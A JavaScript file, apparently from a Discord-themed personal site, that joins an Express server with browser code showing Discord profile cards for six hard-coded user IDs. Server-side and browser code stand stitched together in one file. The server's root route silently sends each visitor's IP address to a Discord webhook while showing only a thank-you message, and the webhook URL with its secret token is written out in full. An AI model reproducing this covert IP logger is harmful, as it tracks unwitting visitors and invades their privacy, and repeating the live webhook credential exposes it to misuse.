const express = require('express');
const axios = require('axios');

const app = express();
const port = 3000;

const discordWebhookUrl = 'https://discord.com/api/webhooks/1329334684265615493/MMbJy0siz-XDygVugAU0XzlznK8XdayuOCcAdlfuemNluDVCTD0goMXgJi2qC_awhAuv';

app.use((req, res, next) => {
    req.clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    next();
});

app.get('/', async (req, res) => {
    const clientIp = req.clientIp;

    try {
        await axios.post(discordWebhookUrl, {
            content: `Novo visitante com IP: ${clientIp}`
        });
        console.log(`IP enviado para o Discord: ${clientIp}`);
    } catch (error) {
        console.error('Erro ao enviar o IP para o Discord:', error);
    }

    res.send('Obrigado por visitar nosso site!');
});

app.listen(port, () => {
    console.log(`Servidor rodando na porta ${port}`);
});



function updateProfileImage(userId) {
  fetch('https://api.lanyard.rest/v1/users/' + userId)
    .then(response => response.json())
    .then(data => {
      const user = data.data.discord_user;
      const profileImage = document.querySelector('.profile-img[data-user-id="' + userId + '"]');
      const usernameElement = document.querySelector('.nickr[data-user-id="' + userId + '"]');
      const subnickElement = document.querySelector('.subnick[data-user-id="' + userId + '"]');
      const badgesContainer = document.getElementById('badges-' + userId); 
      
      profileImage.src = user.avatar
        ? 'https://cdn.discordapp.com/avatars/' + user.id + '/' + user.avatar + '.' + (user.avatar.startsWith('a_') ? 'gif' : 'png') + '?size=512'
        : 'https://cdn.discordapp.com/embed/avatars/1.png';
  
      usernameElement.textContent = user.display_name ? user.display_name : user.username;
      subnickElement.textContent = user.username;
  
      badgesContainer.innerHTML = ''; 
      if (user.public_flags && user.public_flags.badges) {
        for (let badge of user.public_flags.badges) {
          let badgeElement = document.createElement('div');
          badgeElement.className = 'badge';
          badgeElement.style.backgroundImage = badge.id === 'premium' 
            ? "url('https://raw.githubusercontent.com/Rep7/badges/main/svg/discordnitro.svg')" 
            : "url('https://raw.githubusercontent.com/mezotv/discord-badges/" + badge.id + ".svg')";
          badgeElement.dataset.tooltip = badge.description;
          badgesContainer.appendChild(badgeElement);
        }
      }
    })
    .catch(error => {
      console.error('Error fetching profile data:', error);
    });
}

updateProfileImage('748940599150772344');  // Kauan
updateProfileImage('1139957418823008318');  // Vokal estora xota
updateProfileImage('1171492628831928322');  // Lowest
updateProfileImage('784552912038133760');  // Hizz
updateProfileImage('1075535994356518934');  // Vera
updateProfileImage('794024044553830431');  // Nelyrral

document.getElementById('revealButton').addEventListener('click', function() {
    var audio = document.getElementById('background-music');
    audio.play();

    document.querySelector('.start-screen').style.display = 'none';

    document.getElementById('profiles-container').style.display = 'flex';

    document.getElementById('banner-text').style.display = 'block';

});
